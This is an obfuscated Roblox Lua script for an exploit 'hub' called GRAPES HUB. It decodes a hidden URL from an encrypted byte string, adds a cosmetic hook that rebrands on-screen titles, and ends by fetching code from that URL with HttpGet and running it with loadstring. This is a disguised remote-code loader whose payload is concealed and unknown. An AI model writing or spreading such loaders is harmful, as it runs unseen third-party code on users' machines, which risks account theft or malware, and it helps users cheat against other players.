
--[[ STAGE 2: VISUAL CORE ]]
local lLDVitzPxbkUbwLhNL="\152\145\173\244\176\230\232\242\243\248\252\212\242\221\224\212\220\251\004\021\050\078\057\088\072\010\056\032\024\080\076\036\060\068\049\079\110\111\162\121\100\103\110\119\131\151\111\145\147\149\146\169\186\164\170\158\176\184\169\211\018\214\214\211\228\043\237\242\236\231\000\253\008\246\011\093\023\011\043\035\052\049\062\055\073\079\083\153\092\099\092\172\087\118\114\102\133\139\132\120\144\131\138\156\148\172\157\183\186\006\180\195\185\027\032\016\206\208\217\222\247"local gf5F2T1FNamo30=240 local QACDF2gyI5Kpv57cbU1ey2=240 local fcUY3D4iSfNu2=0 local GEUlL4whpki01rmJuD34nA=5 local iqCIq6I6VrV2cUocWps=18 local A2ocEPbov6BBr9MNApM=true local mrV1phQC_dce_J=bit32 and bit32.bxor if not mrV1phQC_dce_J then mrV1phQC_dce_J=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local gH5qa4AnNJDhfK3V2={}for ZRlWzxkyUM6cTFU=1,#lLDVitzPxbkUbwLhNL do local J4Zp1eIUwUmmeMDHDjHtHY=string.byte(lLDVitzPxbkUbwLhNL,ZRlWzxkyUM6cTFU)local icvrBC2OsGdE=(QACDF2gyI5Kpv57cbU1ey2+(ZRlWzxkyUM6cTFU*GEUlL4whpki01rmJuD34nA)+iqCIq6I6VrV2cUocWps)%256 if fcUY3D4iSfNu2==0 then J4Zp1eIUwUmmeMDHDjHtHY=(J4Zp1eIUwUmmeMDHDjHtHY-icvrBC2OsGdE)%256 gH5qa4AnNJDhfK3V2[ZRlWzxkyUM6cTFU]=string.char(mrV1phQC_dce_J(J4Zp1eIUwUmmeMDHDjHtHY,gf5F2T1FNamo30))else J4Zp1eIUwUmmeMDHDjHtHY=mrV1phQC_dce_J(J4Zp1eIUwUmmeMDHDjHtHY,gf5F2T1FNamo30)gH5qa4AnNJDhfK3V2[ZRlWzxkyUM6cTFU]=string.char((J4Zp1eIUwUmmeMDHDjHtHY-icvrBC2OsGdE)%256)end end local RBY0q9W_LbDz2Ub=table.concat(gH5qa4AnNJDhfK3V2)if A2ocEPbov6BBr9MNApM then RBY0q9W_LbDz2Ub=string.reverse(RBY0q9W_LbDz2Ub)end local FyYc37WMtWnuF6tSux=RBY0q9W_LbDz2Ub
local HubName = "GRAPES HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(FyYc37WMtWnuF6tSux))()
